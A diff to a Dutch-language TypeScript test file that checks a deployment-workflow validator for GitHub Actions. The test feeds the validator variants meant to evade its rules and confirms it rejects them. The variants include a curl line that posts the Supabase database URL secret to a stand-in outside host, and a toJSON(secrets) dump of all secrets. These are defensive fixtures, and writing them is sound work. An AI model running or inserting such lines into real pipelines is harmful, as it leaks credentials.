@@ -16,9 +16,11 @@ import {
   controleerTsconfig,
   controleerUitrol,
   controleerUitrolBestanden,
+  controleerSupabaseCli,
   controleerUitrolPakket,
   controleerWranglerZonderBuild,
   controleerWorkflow,
+  jobTekst,
   sparsePaden,
   uitrolStartbestanden,
 } from './controleer-poort.ts';
@@ -164,17 +166,19 @@ describe('taken-Worker (review PR12-05 en PR12-06)', () => {
         return undefined;
       }
     };
-    assert.ok(sparsePaden(uitrol).includes('taken'));
+    const uitrolJob = jobTekst(uitrol, 'uitrol');
+    assert.ok(sparsePaden(uitrolJob).includes('taken'));
     const starts = uitrolStartbestanden(lees('taken/wrangler.jsonc'));
     assert.equal(starts[0]?.pad, 'taken/worker.ts');
-    assert.deepEqual(controleerUitrolBestanden(starts, leesAls, sparsePaden(uitrol)), []);
+    assert.deepEqual(controleerUitrolBestanden(starts, leesAls, sparsePaden(uitrolJob)), []);
   });
 
   it('leest alleen de paden onder sparse-checkout, zonder uitsluitingen of patronen (review PR14-04)', () => {
     const yaml =
       '          sparse-checkout: |\n            uitrol\n            !geheim\n            src/*.ts\n          sparse-checkout-cone-mode: false\n';
     assert.deepEqual(sparsePaden(yaml), ['uitrol']);
-    assert.ok(!sparsePaden(uitrol).some((p) => p.includes(':')));
+    assert.ok(!sparsePaden(jobTekst(uitrol, 'uitrol')).some((p) => p.includes(':')));
+    assert.deepEqual(sparsePaden(jobTekst(uitrol, 'migraties')), ['supabase']);
   });
 
   it('faalt op een import die de poort niet kan volgen (review PR14-04)', () => {
@@ -265,6 +269,64 @@ describe('taken-Worker (review PR12-05 en PR12-06)', () => {
 });
 
 describe('uitrol-workflow', () => {
+  it('de migraties: eigen job, eigen geheim, alleen de Supabase-CLI, en de uitrol wacht erop (besluit 29-10-2026)', () => {
+    assert.deepEqual(controleerUitrol(uitrol), []);
+    assert.deepEqual(controleerSupabaseCli(pakket, uitrol), []);
+    const droog = '          supabase db push --db-url "$SUPABASE_DB_URL" --skip-vault --dry-run\n';
+    // Elke omweg uit review PR20-03 t/m PR20-05 moet worden afgekeurd.
+    const omwegen: Record<string, string> = {
+      'uitrol wacht niet': uitrol.replace('needs: [bouw, migraties]', 'needs: bouw'),
+      'migraties zonder bouw': uitrol.replace('    needs: bouw\n    runs-on', '    runs-on'),
+      'migraties met always()': uitrol.replace(
+        '    needs: bouw\n    runs-on',
+        '    needs: bouw\n    if: always()\n    runs-on',
+      ),
+      'geheim in de verkeerde job': uitrol.replace(
+        '          CLOUDFLARE_ACCOUNT_ID:',
+        '          DB: ${{ secrets.SUPABASE_DB_URL }}\n          CLOUDFLARE_ACCOUNT_ID:',
+      ),
+      'toJSON(secrets)': uitrol.replace(
+        '          CLOUDFLARE_ACCOUNT_ID:',
+        '          ALLES: ${{ toJSON(secrets) }}\n          CLOUDFLARE_ACCOUNT_ID:',
+      ),
+      'secrets met haken': uitrol.replace(
+        '${{ secrets.SUPABASE_DB_URL }}',
+        "${{ secrets['SUPABASE_DB_URL'] }}",
+      ),
+      'YAML-anker': uitrol.replace(
+        '          SUPABASE_DB_URL: ${{ secrets.SUPABASE_DB_URL }}',
+        '          SUPABASE_DB_URL: &db ${{ secrets.SUPABASE_DB_URL }}',
+      ),
+      'npm in de migratiejob': uitrol.replace(droog, `          npm run build\n${droog}`),
+      'curl in de migratiejob': uitrol.replace(
+        droog,
+        `          curl -d "$SUPABASE_DB_URL" https://elders.invalid\n${droog}`,
+      ),
+      'meer uitchecken': uitrol.replace(
+        '          sparse-checkout: |\n            supabase\n',
+        '          sparse-checkout: |\n            supabase\n            src\n',
+      ),
+      'andere omgeving': uitrol.replace('      name: ontwikkel-database', '      name: ontwikkel'),
+      'extra job': uitrol.replace(
+        '\n  uitrol:\n',
+        '\n  stiekem:\n    runs-on: ubuntu-24.04\n    steps:\n      - run: echo\n\n  uitrol:\n',
+      ),
+    };
+    for (const [naam, variant] of Object.entries(omwegen)) {
+      assert.notEqual(variant, uitrol, `${naam}: de vervanging vond niets`);
+      assert.notDeepEqual(controleerUitrol(variant), [], naam);
+    }
+    assert.notDeepEqual(
+      controleerSupabaseCli(pakket, uitrol.replace('version: 2.122.0', 'version: latest')),
+      [],
+    );
+    const tweeKeer = uitrol.replace(
+      '      - name: Migraties online',
+      '      - uses: supabase/setup-cli@45a513f8c64c0bc8e0e3dfe572b5c95be85f6359\n        with:\n          version: latest\n\n      - name: Migraties online',
+    );
+    assert.notDeepEqual(controleerSupabaseCli(pakket, tweeKeer), []);
+  });
+
   it('faalt als een van de sloten verdwijnt (review PR8-02)', () => {
     for (const slot of [
       "github.event.workflow_run.event == 'push' &&",
